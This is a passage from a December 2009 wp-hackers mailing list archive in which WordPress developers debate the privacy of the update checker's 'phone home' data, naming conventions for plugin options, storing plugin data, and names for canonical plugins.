From mikeschinkel at newclarity.net  Wed Dec  9 06:12:33 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 9 Dec 2009 01:12:33 -0500
Subject: [wp-hackers] Storing Arbitrary Data as Custom Post Types
In-Reply-To: <81d01c0912082108n467a7b79oa11af2367b75eda9@mail.gmail.com>
References: <81d01c0912081522o6c2df5y71f5b4d81f72bbb6@mail.gmail.com>
	<BEA30E17-9B87-40E8-9B86-1B8E38A1991E@newclarity.net>
	<81d01c0912081711i28cd7839h610bc3712f76034c@mail.gmail.com>
	<230049E3-56CD-4951-9288-24040A235770@newclarity.net>
	<81d01c0912082108n467a7b79oa11af2367b75eda9@mail.gmail.com>
Message-ID: <4BCB3F06-8A9D-40C8-A50A-A69F7BB8EF4C@newclarity.net>

On Dec 9, 2009, at 12:08 AM, Christopher O'Connell wrote:
> (without getting too O/T on hypermedia), it does constrain it. Consider, if
> each document contains a URL (or a signing url), then this uniquely
> identifies the document.
> 
> Then, the canonical data definitions are those stored in wp-plugins in
> canonical plugins.
> 
> Anyone else have any thoughts? Want to see the bacon? Think I've been off my
> meds for too long?

Either I don't follow or we are talking apples and oranges here.

Some examples might help.

-Mike
P.S. The problem with REST and hypermedia is that in order for a RESTful service to follow hypermedia it needs to agree on some names in the document to know which URLs are used for what aspect. Yet for RESTful services over HTTP there is no standard agreed-upon way to expose matching names hence why I think almost everyone ignored the hypermedia constraint. FWIW.

On Dec 9, 2009, at 12:08 AM, Christopher O'Connell wrote:

> Actually,
> 
> (without getting too O/T on hypermedia), it does constrain it. Consider, if
> each document contains a URL (or a signing url), then this uniquely
> identifies the document.
> 
> Then, the canonical data definitions are those stored in wp-plugins in
> canonical plugins.
> 
> Anyone else have any thoughts? Want to see the bacon? Think I've been off my
> meds for too long?
> 
> ~ Christopher
> 
> On Tue, Dec 8, 2009 at 9:33 PM, Mike Schinkel
> <mikeschinkel at newclarity.net>wrote:
> 
>> On Dec 8, 2009, at 8:11 PM, Christopher O'Connell wrote:
>>> Well, that's more or less where the canonical plugins come in: If each
>>> canonical plugin adheres to a specification for storing data (whether it
>> is
>>> what I have proposed or something else) than other plugins could access
>> the
>>> data of canonical plugins quite simply.
>> 
>> Exactly (assuming you mean that they agree on attribute naming as well as
>> storage methodology, right?)
>> 
>>> The advantage of my proposed solution is that other plugins simply need
>> to
>>> load the definition file from a canonical plugin (presumably somewhere in
>>> wp-plugins) in order to access that data.
>> 
>> Somewhere you'll need to map to a common name, though.  It's a
>> chicken-and-egg problem (and one of the reasons that I have a big problem
>> with the hypermedia constraint in the REST architecture, the one constraint
>> that practically everyone ignores. But I digress.)
>> 
>> 
>>> Indeed I might go so far as to suggest that part of the requirements for
>>> canonical plugins is that those that store data do so in some consistent
>>> fashion.
>> 
>> +1, of course (again, assuming we mean the same thing.)
>> 
>> -Mike
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From peter.westwood at ftwr.co.uk  Wed Dec  9 09:38:00 2009
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Wed, 9 Dec 2009 09:38:00 +0000
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <81d01c0912081720t93c59d5pc6966f071e248be2@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com>
	<2979bd660912062149v583780a2vcec94ec1b7c967c1@mail.gmail.com>
	<427667db0912062233l20b578b4u565a307c15c2d595@mail.gmail.com>
	<4B1DF4C5.8050306@mullenweg.com>
	<FB9E9056-06DC-4A68-95F1-F199481EF8A3@willnorris.com>
	<81d01c0912081720t93c59d5pc6966f071e248be2@mail.gmail.com>
Message-ID: <4886425E-253D-4ED0-A708-C295EA3C53D4@ftwr.co.uk>


On 9 Dec 2009, at 01:20, Christopher O'Connell wrote:

> At the risk of being added to the tinfoil hat brigade I have always  
> found it
> very unsettling that users are not offered an opt out.
>
> As others have pointed out, virtually every piece of software with a  
> phone
> home feature asks for user permission first. Indeed, I suspect  
> (although I
> am not fully up to date on case law) that this has been mandated by  
> the
> deliciously silly wranglings of the legal community (otherwise, why  
> would
> everyone do it?).
>
> But purely from an ethical standpoint, I really think it's important  
> that
> users be allowed to opt out easily and in the core!

In my experience the software that asks about phone home is asking  
about sending detailed data about what you are doing with the software.

For example if WordPress was recording which admin pages you visit  
most often or how often your posted / how many comments you received  
and phoning home that information I would expect to have a very visual  
opt-out.

This is not what we are doing we are sending back a very simple set of  
information:

  * The version WordPress you are using - we need this to be able to  
give you the correct response
  * The versions of PHP and mysql you are using - we need these to be  
able to make sensible decisions about which versions we should support
  * The locale you are using - so we can offer you the update in your  
language
  * The url of the site doing the checks - so we can differentiate  
between different clients in order to aggregate the version numbers  
correctly.

-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From zamoose at gmail.com  Wed Dec  9 13:25:37 2009
From: zamoose at gmail.com (Doug Stewart)
Date: Wed, 9 Dec 2009 08:25:37 -0500
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <4886425E-253D-4ED0-A708-C295EA3C53D4@ftwr.co.uk>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com> 
	<2979bd660912062149v583780a2vcec94ec1b7c967c1@mail.gmail.com> 
	<427667db0912062233l20b578b4u565a307c15c2d595@mail.gmail.com> 
	<4B1DF4C5.8050306@mullenweg.com>
	<FB9E9056-06DC-4A68-95F1-F199481EF8A3@willnorris.com> 
	<81d01c0912081720t93c59d5pc6966f071e248be2@mail.gmail.com> 
	<4886425E-253D-4ED0-A708-C295EA3C53D4@ftwr.co.uk>
Message-ID: <71ddd7490912090525h7838555fk3c7cd0005703cad5@mail.gmail.com>

On Wed, Dec 9, 2009 at 4:38 AM, Peter Westwood <peter.westwood at ftwr.co.uk>wrote:

>
>>  * The url of the site doing the checks - so we can differentiate between
> different clients in order to aggregate the version numbers correctly.
>
>
Why not send an MD5'd (or maybe SHA'd) hash of the URL? You're guaranteed
the uniqueness per reporting site but don't have a way to reverse the hash
to get an explicit URL. Perhaps that would alleviate some of the issue folks
are tripping over?

(Leaving aside the fact that you'll still have the IP of the reporting site
and thus could guess what site a given request came from, if pressed...)

-- 
-Doug
@zamoose
http://literalbarrage.org/blog/

From hempsworth at googlemail.com  Wed Dec  9 14:11:42 2009
From: hempsworth at googlemail.com (Alex Hempton-Smith)
Date: Wed, 9 Dec 2009 14:11:42 +0000
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <71ddd7490912090525h7838555fk3c7cd0005703cad5@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com> 
	<2979bd660912062149v583780a2vcec94ec1b7c967c1@mail.gmail.com> 
	<427667db0912062233l20b578b4u565a307c15c2d595@mail.gmail.com> 
	<4B1DF4C5.8050306@mullenweg.com>
	<FB9E9056-06DC-4A68-95F1-F199481EF8A3@willnorris.com> 
	<81d01c0912081720t93c59d5pc6966f071e248be2@mail.gmail.com> 
	<4886425E-253D-4ED0-A708-C295EA3C53D4@ftwr.co.uk>
	<71ddd7490912090525h7838555fk3c7cd0005703cad5@mail.gmail.com>
Message-ID: <5a1dad880912090611o78acb74fl61d3432fddd7479a@mail.gmail.com>

I think the problem is data being sent *at all* without the ability for
users to easily control it (without installing plugins to protect their
data), regardless of what that data is and how personally identifying it is.

With a preference pane in place (the anonymous data prechecked) it also
gives us scope to allow users the option to start sending some more
interesting data:

recording which admin pages you visit most often or how often your posted /
how many comments you received

Which would be great for some usability stats etc. I have no objection to
that data being sent, I have no ojection to the more general data being sent
-* just give me the choice*!

-- Alex  (Hempsworth)

From gaarai at gaarai.com  Wed Dec  9 15:26:06 2009
From: gaarai at gaarai.com (Chris Jean)
Date: Wed, 09 Dec 2009 09:26:06 -0600
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <4886425E-253D-4ED0-A708-C295EA3C53D4@ftwr.co.uk>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com>	<2979bd660912062149v583780a2vcec94ec1b7c967c1@mail.gmail.com>	<427667db0912062233l20b578b4u565a307c15c2d595@mail.gmail.com>	<4B1DF4C5.8050306@mullenweg.com>	<FB9E9056-06DC-4A68-95F1-F199481EF8A3@willnorris.com>	<81d01c0912081720t93c59d5pc6966f071e248be2@mail.gmail.com>
	<4886425E-253D-4ED0-A708-C295EA3C53D4@ftwr.co.uk>
Message-ID: <4B1FC18E.3000203@gaarai.com>

I think just the fact that Peter felt the need to list the data sent to 
the servers in order to justify how everyone's privacy concerns are 
invalid does more to support the privacy concerns than dismiss them. If 
we, the list of hackers of all things WordPress, had to get a core dev 
tell us what is sent to the wp.org servers, how are standard users 
supposed to know what is or is not sent to the wp.org servers?

Additionally, if we have to have a legal analysis of whether or not the 
privacy statement on the wp.org site applies to the wp software or not, 
wouldn't it be reasonable to assume that not everyone is clear on 
whether that privacy statement applies to the software or not?

Personally, I don't care one bit. I know what information is sent all 
over the net each time I request a web page. I know how trivially-easy 
it is to start with a single piece of information (say an IP address) 
and determine a wealth of data from that information.

However, this isn't about what people may or may not know about the 
technical infrastructure of the internet nor is it about WordPress 
users' ability to interpret a privacy statement. What other software may 
or may not share when it sends data to a centralized system is also 
immaterial. This discussion is about the WordPress software and how 
people feel that they don't have adequate control over the information 
that the software they installed on their server sends out to the world.

If a user's potentially-unfounded fears cause them to do something that 
is reckless or dangerous (say disabling the automatic updater) and a 
solution is available that would remove those fears without also 
subjecting anyone else to reduced security (say being able to determine 
what information is sent to the wp.org servers), then wouldn't it be in 
the best interest of everyone to allow such solution? I'm sure that many 
will (and I believe many already have) argue that such a solution is 
available via plugins. While this is true, it does bring us to the true 
question that this topic begs an answer to:

If WordPress core has a feature that causes privacy concerns, is enabled 
by default, and runs automatically, is it acceptable that the only true 
solution to the privacy concern requires that the user discover the 
existence of a third-party plugin and then use that plugin?

Put another way, as a standard going forward, should the introduction of 
core features that introduce privacy concerns also require the inclusion 
in core of settings that allow the control of the information such 
features send?

Will Norris makes a great point when he shows that many that are having 
difficulty understanding the concerns are thinking about things 
backwards, from a WordPress-provider viewpoint rather than a 
WordPress-consumer viewpoint. He also makes a great point about the 
bareness of the Privacy page.

Would it really be that detrimental to put an additional section in the 
Privacy page talking about the updater, what information it sends, and 
allowing for the control over the information that is sent? This section 
could also include the privacy policy of WordPress.org so that it is 
clear what the privacy policy is.

Such an addition to the Privacy page could offer two options detailing 
what information is sent:

   1. Default
          * WordPress version and locale - This information is necessary
            in order to provide updates for your WordPress software.
          * Installed plugins - This information is necessary in order
            to provide updates for your plugins.
          * PHP and MySQL version numbers - This information allows
            WordPress developers plan what software support is needed by
            WordPress.
          * Site address (URL) - This information is used to determine
            how many installations of WordPress exist and how many of
            each version is run. This helps WordPress developers plan
            new release schedules. This information is only used to
            generate statistical usage information and is never shared
            with third parties.
          * Server IP address - Due to how the internet operates, each
            time your WordPress software contacts the update servers,
            the update servers also receive your server's IP address.
            This information is never stored.
   2. Minimal
          * WordPress version and locale - This information is necessary
            in order to provide updates for your WordPress software.
          * Installed plugins - This information is necessary in order
            to provide updates for your plugins.
          * Server IP address - Due to how the internet operates, each
            time your WordPress software contacts the update servers,
            the update servers also receive your server's IP address.
            This information is never stored.

At first I thought a third option could be provided that would disable 
plugin and WordPress updates while explaining that selecting that option 
is not recommended for security reasons. Then I thought better of it as 
it would be better to require the additional steps to disable features 
that greatly improve site security.

While I have no doubt that the data gathered from the updater requests 
is of great value, dismissing valid (or even invalid) privacy concerns 
of users due to a lack of majority demand and due to technical or legal 
arguments just to protect the gathering of data is a poor way of 
responding to users.

Chris Jean
http://gaarai.com/
@chrisjean



Peter Westwood wrote:
>
> In my experience the software that asks about phone home is asking 
> about sending detailed data about what you are doing with the software.
>
> For example if WordPress was recording which admin pages you visit 
> most often or how often your posted / how many comments you received 
> and phoning home that information I would expect to have a very visual 
> opt-out.
>
> This is not what we are doing we are sending back a very simple set of 
> information:
>
>  * The version WordPress you are using - we need this to be able to 
> give you the correct response
>  * The versions of PHP and mysql you are using - we need these to be 
> able to make sensible decisions about which versions we should support
>  * The locale you are using - so we can offer you the update in your 
> language
>  * The url of the site doing the checks - so we can differentiate 
> between different clients in order to aggregate the version numbers 
> correctly.
>

From if.website at gmail.com  Wed Dec  9 15:30:28 2009
From: if.website at gmail.com (Austin Matzko)
Date: Wed, 9 Dec 2009 09:30:28 -0600
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <4886425E-253D-4ED0-A708-C295EA3C53D4@ftwr.co.uk>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com>
	<2979bd660912062149v583780a2vcec94ec1b7c967c1@mail.gmail.com>
	<427667db0912062233l20b578b4u565a307c15c2d595@mail.gmail.com>
	<4B1DF4C5.8050306@mullenweg.com>
	<FB9E9056-06DC-4A68-95F1-F199481EF8A3@willnorris.com>
	<81d01c0912081720t93c59d5pc6966f071e248be2@mail.gmail.com>
	<4886425E-253D-4ED0-A708-C295EA3C53D4@ftwr.co.uk>
Message-ID: <674b4a3b0912090730m3ff7e39cnc7f2bf02b7b6bfd5@mail.gmail.com>

On Wed, Dec 9, 2009 at 3:38 AM, Peter Westwood
<peter.westwood at ftwr.co.uk> wrote:
> This is not what we are doing we are sending back a very simple set of
> information:
>
> ?* The version WordPress you are using - we need this to be able to give you
> the correct response
> ?* The versions of PHP and mysql you are using - we need these to be able to
> make sensible decisions about which versions we should support
> ?* The locale you are using - so we can offer you the update in your
> language
> ?* The url of the site doing the checks - so we can differentiate between
> different clients in order to aggregate the version numbers correctly.

You omitted (in my mind) the big one:

* All plugins, active and inactive, in your plugins directory

From otto at ottodestruct.com  Wed Dec  9 15:34:28 2009
From: otto at ottodestruct.com (Otto)
Date: Wed, 9 Dec 2009 09:34:28 -0600
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <674b4a3b0912090730m3ff7e39cnc7f2bf02b7b6bfd5@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com> 
	<2979bd660912062149v583780a2vcec94ec1b7c967c1@mail.gmail.com> 
	<427667db0912062233l20b578b4u565a307c15c2d595@mail.gmail.com> 
	<4B1DF4C5.8050306@mullenweg.com>
	<FB9E9056-06DC-4A68-95F1-F199481EF8A3@willnorris.com> 
	<81d01c0912081720t93c59d5pc6966f071e248be2@mail.gmail.com> 
	<4886425E-253D-4ED0-A708-C295EA3C53D4@ftwr.co.uk>
	<674b4a3b0912090730m3ff7e39cnc7f2bf02b7b6bfd5@mail.gmail.com>
Message-ID: <161617690912090734m35a8584u76d28f24bc08534b@mail.gmail.com>

On Wed, Dec 9, 2009 at 9:30 AM, Austin Matzko <if.website at gmail.com> wrote:
> You omitted (in my mind) the big one:
>
> * All plugins, active and inactive, in your plugins directory

The thing is expressly designed to check for plugin updates. You can't
check for updates to a plugin without actually telling the update
server what the plugins actually are.

If this is a privacy issue for you, then there's means already
available to disable the update checks entirely.

-Otto

From gaarai at gaarai.com  Wed Dec  9 15:42:48 2009
From: gaarai at gaarai.com (Chris Jean)
Date: Wed, 09 Dec 2009 09:42:48 -0600
Subject: [wp-hackers] Plugin Privacy Option (was Revisiting phone home and
	privacy)
Message-ID: <4B1FC578.8010706@gaarai.com>

I thought of including this in my response to the main topic, but it 
would just get lost in there.

At some point in the conversation, the idea of sharing plugin data for 
all plugins and not just plugins from the repo was shared. I pondered on 
this for a bit, and I think I have a good solution to this problem.

To me, the only solution for plugin updates is for the server to send 
what it has since any other option would be highly-inefficient or very 
error prone. So, why not add the ability for a plugin to opt out of 
having its information included in the update request? This should only 
require a minimal change to the update code and won't require any 
changes to the update servers.

Here's an example of what such a privacy entry would look like in a plugin:

Plugin Name: Internal Plugin
Plugin URI: http://itsasecret.com/
Description: This is not just a plugin, it symbolizes the plans and 
secrets of an entire corporation summed up in a plugin name.
Author: Bernard Madoff
Version: 7.2.1
Author URI: http://thisisalsoasecret.com/
Disable Updates: yes

Of course, the exact phrase to use is open to discussion. I just wanted 
to introduce the idea.

If people like this idea, I can work on a patch to put on trac.

-- 
Chris Jean
http://gaarai.com/
@chrisjean


From if.website at gmail.com  Wed Dec  9 15:52:18 2009
From: if.website at gmail.com (Austin Matzko)
Date: Wed, 9 Dec 2009 09:52:18 -0600
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <161617690912090734m35a8584u76d28f24bc08534b@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com>
	<2979bd660912062149v583780a2vcec94ec1b7c967c1@mail.gmail.com>
	<427667db0912062233l20b578b4u565a307c15c2d595@mail.gmail.com>
	<4B1DF4C5.8050306@mullenweg.com>
	<FB9E9056-06DC-4A68-95F1-F199481EF8A3@willnorris.com>
	<81d01c0912081720t93c59d5pc6966f071e248be2@mail.gmail.com>
	<4886425E-253D-4ED0-A708-C295EA3C53D4@ftwr.co.uk>
	<674b4a3b0912090730m3ff7e39cnc7f2bf02b7b6bfd5@mail.gmail.com>
	<161617690912090734m35a8584u76d28f24bc08534b@mail.gmail.com>
Message-ID: <674b4a3b0912090752k4e493d62pdf405bbe88347146@mail.gmail.com>

On Wed, Dec 9, 2009 at 9:34 AM, Otto <otto at ottodestruct.com> wrote:
> On Wed, Dec 9, 2009 at 9:30 AM, Austin Matzko <if.website at gmail.com> wrote:
>> You omitted (in my mind) the big one:
>>
>> * All plugins, active and inactive, in your plugins directory
>
> The thing is expressly designed to check for plugin updates. You can't
> check for updates to a plugin without actually telling the update
> server what the plugins actually are.

Actually, there's a big difference between these two scenarios:

- Sending a site's URL and all associated plugins at a URL
- Requesting from an IP address with perhaps a hashed URL the status
of a particular plugin.

Both accomplish the same goal of finding plugin updates; one is much
more invasive than the other.

> If this is a privacy issue for you, then there's means already
> available to disable the update checks entirely.

There's no reason to conflate the updates with the data collection.
It's possible to check for updates without collecting any data and
without revealing anything particular about the original requester
other than last proxy IP address.

From wp at xentek.net  Wed Dec  9 15:55:14 2009
From: wp at xentek.net (Eric Marden)
Date: Wed, 9 Dec 2009 10:55:14 -0500
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <4B1FC18E.3000203@gaarai.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com>	<2979bd660912062149v583780a2vcec94ec1b7c967c1@mail.gmail.com>	<427667db0912062233l20b578b4u565a307c15c2d595@mail.gmail.com>	<4B1DF4C5.8050306@mullenweg.com>	<FB9E9056-06DC-4A68-95F1-F199481EF8A3@willnorris.com>	<81d01c0912081720t93c59d5pc6966f071e248be2@mail.gmail.com>
	<4886425E-253D-4ED0-A708-C295EA3C53D4@ftwr.co.uk>
	<4B1FC18E.3000203@gaarai.com>
Message-ID: <32610B93-0B9B-4D0C-8F68-CE3E8DA760E6@xentek.net>


On Dec 9, 2009, at 10:26 AM, Chris Jean wrote:

> I think just the fact that Peter felt the need to list the data sent  
> to the servers in order to justify how everyone's privacy concerns  
> are invalid does more to support the privacy concerns than dismiss  
> them. If we, the list of hackers of all things WordPress, had to get  
> a core dev tell us what is sent to the wp.org servers, how are  
> standard users supposed to know what is or is not sent to the wp.org  
> servers?

I think you're reading a lot more into what he posted. My feeling is  
that he was posting it to be sure that discussion remained routed in  
reality (given that people where throwing out very Orwellian, track  
every page click type of scenarios, which the software does not do).

>  * The version WordPress you are using - we need this to be able to  
> give you the correct response
>  * The locale you are using - so we can offer you the update in your  
> language

These two are needed to even provide updates. You can already turn off  
updates today, just not from an option in the admin.

>  * The url of the site doing the checks - so we can differentiate  
> between different clients in order to aggregate the version numbers  
> correctly.
>  * The versions of PHP and mysql you are using - we need these to be  
> able to make sensible decisions about which versions we should support

These two are the privacy concerns, but are pretty innocuous (for most  
people at least). Being able to turn this off (or switching to hashes  
of the info perhaps) would be welcomed, but again this needn't  
necessarily be an option in the admin, but wp-config key or other means.




- Eric Marden
__________________________________
http://xentek.net/code/wordpress/
tw: @xentek





From wp at xentek.net  Wed Dec  9 16:05:10 2009
From: wp at xentek.net (Eric Marden)
Date: Wed, 9 Dec 2009 11:05:10 -0500
Subject: [wp-hackers] Storing Arbitrary Data as Custom Post Types
In-Reply-To: <81d01c0912081711i28cd7839h610bc3712f76034c@mail.gmail.com>
References: <81d01c0912081522o6c2df5y71f5b4d81f72bbb6@mail.gmail.com>
	<BEA30E17-9B87-40E8-9B86-1B8E38A1991E@newclarity.net>
	<81d01c0912081711i28cd7839h610bc3712f76034c@mail.gmail.com>
Message-ID: <7B94CAEB-30C4-4DE2-9D57-76C34E483E52@xentek.net>


On Dec 8, 2009, at 8:11 PM, Christopher O'Connell wrote:

> Indeed I might go so far as to suggest that part of the requirements  
> for
> canonical plugins is that those that store data do so in some  
> consistent
> fashion.


Isn't that what the WordPress API already does? If they are already  
following current best practices, its easy to discover their data  
structure without some arbitrary XML/JSON/YAML definition file that we  
have to maintain and pass around. Its WordPress, not a SOAP Service.

my 2 cents,

- Eric Marden
__________________________________
http://xentek.net/code/wordpress/
tw: @xentek





From otto at ottodestruct.com  Wed Dec  9 16:15:35 2009
From: otto at ottodestruct.com (Otto)
Date: Wed, 9 Dec 2009 10:15:35 -0600
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <674b4a3b0912090752k4e493d62pdf405bbe88347146@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com> 
	<2979bd660912062149v583780a2vcec94ec1b7c967c1@mail.gmail.com> 
	<427667db0912062233l20b578b4u565a307c15c2d595@mail.gmail.com> 
	<4B1DF4C5.8050306@mullenweg.com>
	<FB9E9056-06DC-4A68-95F1-F199481EF8A3@willnorris.com> 
	<81d01c0912081720t93c59d5pc6966f071e248be2@mail.gmail.com> 
	<4886425E-253D-4ED0-A708-C295EA3C53D4@ftwr.co.uk>
	<674b4a3b0912090730m3ff7e39cnc7f2bf02b7b6bfd5@mail.gmail.com> 
	<161617690912090734m35a8584u76d28f24bc08534b@mail.gmail.com> 
	<674b4a3b0912090752k4e493d62pdf405bbe88347146@mail.gmail.com>
Message-ID: <161617690912090815o58904676me3726b81e361728f@mail.gmail.com>

On Wed, Dec 9, 2009 at 9:52 AM, Austin Matzko <if.website at gmail.com> wrote:
> Actually, there's a big difference between these two scenarios:
>
> - Sending a site's URL and all associated plugins at a URL
> - Requesting from an IP address with perhaps a hashed URL the status
> of a particular plugin.
>
> Both accomplish the same goal of finding plugin updates; one is much
> more invasive than the other.

So, I assume you have disabled all XML-RPC pings and turned your site
to Private mode (Settings-Privacy) which prevents search engines from
indexing your site as well?

Because, by default, WordPress sends your URL to Pingomatic every
single time you post. That's sort of the whole point of XML-RPC pings.
And, Pingomatic is owned by Automattic, in case you were unaware.

> There's no reason to conflate the updates with the data collection.

Sure there is, because the only "data collection" in the sense you
mean it is the PHP and MySQL version numbers. That's the *only* thing
sent that is used for statistical information.

> It's possible to check for updates without collecting any data and
> without revealing anything particular about the original requester
> other than last proxy IP address.

So, what is it, precisely, that you object to with the existing data
collection. What piece of information is being sent that you consider
to be private and would not want to send? No theoretical arguments,
please. You know the data being sent, it's been posted here.
Specifically which piece concerns you, exactly? Why?

-Otto

From jer at simianuprising.com  Wed Dec  9 16:17:02 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Wed, 9 Dec 2009 11:17:02 -0500
Subject: [wp-hackers] Some Left-Field names for Canonical Plugins
In-Reply-To: <71ddd7490912071944x6e289edbic8dcb00b6a021e41@mail.gmail.com>
References: <71ddd7490912071944x6e289edbic8dcb00b6a021e41@mail.gmail.com>
Message-ID: <e1202cb10912090817g70223f7aq6a0dd10fd3c396c2@mail.gmail.com>

On Mon, Dec 7, 2009 at 10:44 PM, Doug Stewart <zamoose at gmail.com> wrote:
> -Buffed (EQ/BUF): All you WoW players will shout for joy when you come
> across a gold-colored plugin. Finally, you can retire that light green
> Twitter plugin you've been hanging on to for want of something better!

Okay, so if we're using WoW metaphors they would obviously be called
'Epic' plugins. Which IMHO is also a pretty awesome name in reality,
though it applies better to that specific class of plugins like
NextGenGallery or Pods that explode WordPress with new stuff.

I'll also take a second to shit all over 'Premium' and 'Core' as names
for "canonical plugins".

Premium as implied in the poll already has a meaning in WP-land and
its almost diametrically opposed to what the canonical plugins are.
Premium WP stuff is paid and defined by its scarcity. The canonical
plugins will be ever-present and obviously as free as is conceivable.

As far as 'core' goes I think its just plain oxymoronic. Plugins by
their definition are NOT CORE. They are plugins! If we're including
these plugins in core, i.e. in the download .zip file, then maybe it
could work, but it really seems like an unnecessary commitment to call
them as such, and it limits our ability to have them outside the .zip
without looking like fools. Official, Canonical, Blessed, words like
that describe them as plugins. Calling them Core just makes no sense.

p.s. I like 'Official', I think it means almost the exact same thing
as 'Canonical' but in a way that everyone can understand. IMHO
Canonical is also good and has exactly the right meaning. If we call
our documentation wiki 'Codex' haven't we already given up on clarity?
:P

-- 
Jeremy Clarke | http://jeremyclarke.org
Code and Design | http://globalvoicesonline.org

From dougal at gunters.org  Wed Dec  9 16:19:10 2009
From: dougal at gunters.org (Dougal Campbell)
Date: Wed, 09 Dec 2009 11:19:10 -0500
Subject: [wp-hackers] Storing Arbitrary Data as Custom Post Types
In-Reply-To: <BEA30E17-9B87-40E8-9B86-1B8E38A1991E@newclarity.net>
References: <81d01c0912081522o6c2df5y71f5b4d81f72bbb6@mail.gmail.com>
	<BEA30E17-9B87-40E8-9B86-1B8E38A1991E@newclarity.net>
Message-ID: <4B1FCDFE.2070802@gunters.org>

On Dec 8 2009 6:45 PM, Mike Schinkel wrote:
> Without commenting on the worth of the idea (because I haven't considered how it would work in all scenarios yet) I will say that the idea is orthogonal to the problem of mismatched names across plugins.  Using the approach you propose we'll still have the problem where one plugin called a data item "Start Date" and another calls it "Event Date."
>
> Yes those two data elements can live in harmony with each other (that's no different from custom fields that are already in WordPress) but that still doesn't allow the two plugins to work together by sharing data. Until they somehow agree that an event's starting date is  named either "Start Date" or "Event Date" then they will be incompatibility and the sum won't be greater than the parts.
>    

Focusing on just the part of this that deals with name collisions 
between plugins... Back in August, I started a draft post where I was 
going to propose a standard format for plugin option names, in order to 
reduce namespace collisions. After writing a few paragraphs, I decided 
not to publish it, because it was pretty esoteric, probably not of 
interest except to a few developers, and I had doubts that enough 
developers would actually adopt anything like it. But since there's a 
discussion going that's touching on the subject, I now wonder if I 
should touch my post up and publish it?

In a nutshell, my proposal was going to be that we use a naming 
convention like: [area]:[slug]:[name]

For example, if you had a plugin named "Tweet Fu" (which has the slug 
'tweet-fu' in the respository), you might have an option named: 
plugin:tweet-fu:last_tweet_timestamp

Or if you have a theme that saves its own option: 
theme:my-theme-name:header_image_filename

Basically, area is the "realm" of the option, like 'plugin', 'theme', 
'core', etc., and slug is generally the plugin or theme nicename (or a 
placeholder like '_wp_' or '_transient_' for core options).

Any interest in me publishing the post with more details of the pros and 
cons? As I said, I doubt that it's anything that will take the world by 
storm, but perhaps the idea could evolve into some sort of suggested 
Best Practice.

-- 
Dougal Campbell <dougal at gunters.org>
http://dougal.gunters.org/
http://twitter.com/dougal
http://twitual.com/

From matt at mattjacob.com  Wed Dec  9 16:20:38 2009
From: matt at mattjacob.com (Matt Jacob)
Date: Wed, 9 Dec 2009 09:20:38 -0700
Subject: [wp-hackers] $wp_rewrite->flush_rules() on plugin activation
In-Reply-To: <674b4a3b0912081528kee7d1d0u61e1265dca50b62b@mail.gmail.com>
References: <410963320912081439kfd9ab9cr3325216737cb54ec@mail.gmail.com> 
	<674b4a3b0912081449q133dffe3k11cd8f67e9cbe71f@mail.gmail.com> 
	<410963320912081452o31f21aei262cfa0d22c82a7f@mail.gmail.com> 
	<674b4a3b0912081503p43d9cdfap745334222cb0257b@mail.gmail.com> 
	<410963320912081517l77fe898esde271574947a1716@mail.gmail.com> 
	<674b4a3b0912081528kee7d1d0u61e1265dca50b62b@mail.gmail.com>
Message-ID: <410963320912090820t27dea07bx234031cabf212ced@mail.gmail.com>

On Tue, Dec 8, 2009 at 4:28 PM, Austin Matzko <if.website at gmail.com> wrote:

[snip]

OK, thanks again for the help. The actual code to do this is not hard
to understand, but the documentation in the Codex for all things
WP_Rewrite seems to be lacking. I'd be happy to help improve it, but I
haven't explored enough of the internals yet to be able to write
definitively about it.

In my mind, what's really lacking is a how-to for plugin developers on
using WP_Rewrite correctly. There are already a few code snippets in
the Codex, but they're isolated examples. And after all, why would you
be using WP_Rewrite in the first place if not within the context of a
plugin?

Matt

From zamoose at gmail.com  Wed Dec  9 16:37:52 2009
From: zamoose at gmail.com (Doug Stewart)
Date: Wed, 9 Dec 2009 11:37:52 -0500
Subject: [wp-hackers] Some Left-Field names for Canonical Plugins
In-Reply-To: <e1202cb10912090817g70223f7aq6a0dd10fd3c396c2@mail.gmail.com>
References: <71ddd7490912071944x6e289edbic8dcb00b6a021e41@mail.gmail.com>
	<e1202cb10912090817g70223f7aq6a0dd10fd3c396c2@mail.gmail.com>
Message-ID: <71ddd7490912090837v1d4d3276k8c9c9be29a904328@mail.gmail.com>

On 12/9/09, Jeremy Clarke <jer at simianuprising.com> wrote:
>
> p.s. I like 'Official', I think it means almost the exact same thing
> as 'Canonical' but in a way that everyone can understand. IMHO
> Canonical is also good and has exactly the right meaning. If we call
> our documentation wiki 'Codex' haven't we already given up on clarity?
> :P

"Epic".  Heh.

Since folks have been talking about these yet-unnamed plugins as
sturdy bases from which to author all manner of WP-related goodness, I
